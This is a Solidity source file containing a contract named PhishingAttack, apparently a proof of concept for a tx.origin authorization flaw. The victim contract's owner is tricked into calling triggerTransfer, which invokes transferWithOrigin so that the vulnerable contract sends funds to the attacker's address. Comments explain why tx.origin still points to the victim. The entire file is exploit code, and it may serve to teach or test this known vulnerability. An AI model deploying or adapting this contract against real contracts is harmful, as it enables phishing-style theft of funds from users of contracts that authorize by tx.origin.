// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableAccessControl {
    function transferWithOrigin(address to) external;
}

contract PhishingAttack {
    IVulnerableAccessControl public victim;

    constructor(address _victim) {
        victim = IVulnerableAccessControl(_victim);
    }

  // The legitimate victim calls this seemingly harmless function
  // tx.origin remains the victim → the vulnerable contract authorizes the transfer
    function triggerTransfer(address attacker) external {
        victim.transferWithOrigin(attacker);
    }
}
